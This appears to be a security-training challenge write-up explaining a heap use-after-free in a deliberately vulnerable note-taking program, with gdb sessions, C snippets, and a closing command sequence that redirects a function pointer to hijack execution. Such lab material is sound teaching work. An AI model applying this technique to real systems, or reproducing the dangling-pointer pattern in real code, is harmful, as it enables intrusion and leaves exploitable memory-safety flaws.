# Heap use-after-free analysis

## Introduction

In this challenge, we will analyse a program where we can store "notes" and
retrieve them later. We will find a bug when deleting an object, and get a
"dangling pointer" where we can access other objects on the heap.

## Goal

* Understand how heap works
* Understand how use-after-free works
* Get our static and dynamic analysis skills to the next level

## Source

Execute `make` in the directory `~/challenges/challenge31`.


### Interface

The noteheap program understands the following commands:

```
> help
Noteheap:
Todo's:
  todo add <list> <prio> <todotext>
  todo edit <list>:<entry> <prio> <todotext>

List:
  todolist view <list>
  todolist add <listDst> <listSrc>:<entry>
  todolist del <list> <entry>

Alarm:
  alarm add <alarmText>
  alarm list
  alarm view <alarmIndex>
  alarm del <alarmIndex>
```


## Step by step

Start the `noteheap` program in gdb:

```
/root/challenges/challenge31 # gdb -q ./noteheap
Reading symbols from ./noteheap...(no debugging symbols found)...done.
(gdb) r
Starting program: /root/challenges/challenge31/noteheap
Welcome to noteheap v1.0
>
```


### Preparation

Lets add a new `todo` to to list `work` with priority 64:
```
> todo add work 64 test
Todo added to list work as nr 0 (prio 0x40, body: "test")
```

Now add this todo also to the list `private`:
```
> todolist add private work:0
Added todo from work:0 to private:0
```

This todo is not available in both lists:
```
> todolist view work
View List: work
  index: 0
    body: test
    prio: 0x40
    guid: 0x0
> todolist view private
View List: private
  index: 0
    body: test
    prio: 0x40
    guid: 0x0
```

Note that the `view` command displays the priority in hex, not in decimal.


### Bug

Ok, now lets delete the todo from the list `work`. Note that it doesnt matter
from which list we delete it, can also be `private`.

```
> todolist del work:0
Deleted entry 0 on list work

> todolist view work
View List: work

> todolist view private
View List: private
  index: 0
    body:
    prio: 0x40
    guid: 0x0
```

The todo entry still appears in the list `private`. Even though the body and guid
are missing, the prio (priority) is still intact.

The code to delete a todo entry (`listDel()`) is basically:
```
todo = global.todos[listIndex][listEntryIndex];
free(todo->body);
free(todo);
global.todos[listIndex][listEntryIndex] = NULL;
```

But lets add an alarm. The alarm object has the same size as the todo object.
Therefore it will be allocated on the same memory location as the todo object
we deleted (free'd) above:

```
> alarm add testalarm
Added alarm ("testalarm", 0)

> todolist view private
View List: private
  index: 0
    body: testalarm
    prio: 0x4008ed
    guid: 0x0
```

Remember the definitions of the todo and alarm objects:

```c
typedef struct {
	char *body;
	int priority;
	int id;
} Todo;

typedef struct {
	char *name;
	void (*cleanupFunction)();
	int id;
} Alarm;
```

After we allocated an alarm object, which appeared at the location of the deleted
todo object, the alarm object gets initialized:

```
void alarmAdd(char *alarmName) {
	Alarm *alarm;

	alarm = malloc(sizeof(Alarm));
	alarm->name = strdup(alarmName);
	alarm->cleanupFunction = &alarmCleanupFunction;
	alarm->id = global.alarmId++;

	global.alarms[alarmGetFreeEntryIndex()] = alarm;
}
```

Therefore when we look at the todo entry in the list private, the priority `prio`
is at the same memory location as the variable `cleanupFunction` in the alarm object.
We can conclude that the memory address of `alarmCleanupFunction` is `0x4008ed`.


### Arbitrary coode execution

Lets change the priority of the todo object:
```
> todo edit private:0 1094795585 BBBB
Todo private:1 modified (prio 0x41414141, body: "BBBB")

> todolist view private
View List: private
  index: 0
    body: BBBB
    prio: 0x41414141
    guid: 0x0
> alarm list
Alarm: 0
  Name: BBBB
  gid: 0x0
```

We set the priority to the value 0x41414141. This means that the `cleanupFunction`
is also set to this value.


If we look at the `alarmDel()` function, we see that this `cleanupFunction()` is
being called when we remove the alarm:

```c
void alarmDel(int alarmIndex) {
	Alarm *alarm;

	alarm = global.alarms[alarmIndex];
	global.alarms[alarmIndex] = NULL;

	free(alarm->name);
	alarm->cleanupFunction();
	free(alarm);
}
```

Lets try it:
```
> alarm del 0

Program received signal SIGSEGV, Segmentation fault.
0x0000000041414141 in ?? ()
(gdb)
```

Success! RIP is set to 0x41414141, as we intended.


## Exploit

```
todo add work 64 test
todolist add private work:0
todolist del work:0


alarm add testalarm
todo edit private:0 456 "AA"
alarm del 0
```
